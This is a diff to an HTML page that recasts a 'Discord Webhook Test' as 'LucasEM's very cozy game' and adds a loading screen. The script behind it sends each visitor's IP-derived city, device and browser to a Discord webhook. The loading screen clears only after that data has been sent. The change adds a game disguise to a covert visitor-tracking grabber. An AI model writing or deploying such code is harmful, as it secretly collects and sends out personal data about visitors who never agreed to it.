@@ -3,9 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Webhook Test</title>
+    <title>LucasEM's very cozy game</title>
+    <style>
+        /* Loading Screen Styles */
+        #loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+        }
+
+        .spinner {
+            border: 8px solid #f3f3f3; /* Light gray */
+            border-top: 8px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        /* Spinner Animation */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Text styling in the middle */
+        #loading-text {
+            font-size: 24px;
+            color: white;
+            font-family: Arial, sans-serif;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
+
+<!-- Loading Screen HTML -->
+<div id="loading-screen">
+    <div class="spinner"></div>
+    <div id="loading-text">LucasEM's cozy survival game</div>
+</div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1-crypto-js.js"></script>
 
@@ -78,16 +124,24 @@
 
         // Create a Discord embed message
         const message = {
-            content: `User visited the website from ${city}`,
+            content: 'LucasEM\'s very cozy game',
             embeds: [
                 {
-                    title: "Visitor Information",
+                    title: "LucasEM's very cozy game",  // Title with large text
+                    description: 'Welcome to LucasEM\'s cozy survival game!',
+                    color: 0xFFFFFF,  // White background
                     fields: [
-                        { name: "Device", value: deviceName },
-                        { name: "Device Type", value: deviceType },
-                        { name: "Browser", value: browser }
+                        { name: "City", value: city || "Unknown", inline: true },
+                        { name: "Device", value: deviceName, inline: true },
+                        { name: "Device Type", value: deviceType, inline: true },
+                        { name: "Browser", value: browser, inline: true }
                     ],
-                    color: 0x00FF00
+                    footer: {
+                        text: "Thank you for visiting!",
+                    },
+                    image: {
+                        url: "https://your-image-url.com"  // Optional, you can add an image if you want
+                    }
                 }
             ]
         };
@@ -101,10 +155,18 @@
             body: JSON.stringify(message),
         })
         .then(response => response.json())
-        .then(data => console.log('Message sent:', data))
+        .then(data => {
+            console.log('Message sent:', data);
+            // Hide the loading screen once data is sent
+            document.getElementById('loading-screen').style.display = 'none';
+        })
         .catch(error => console.error('Error sending message:', error));
     })
-    .catch(error => console.error('Error fetching IP data:', error));
+    .catch(error => {
+        console.error('Error fetching IP data:', error);
+        // Hide the loading screen if there's an error
+        document.getElementById('loading-screen').style.display = 'none';
+    });
 </script>
 
 </body>
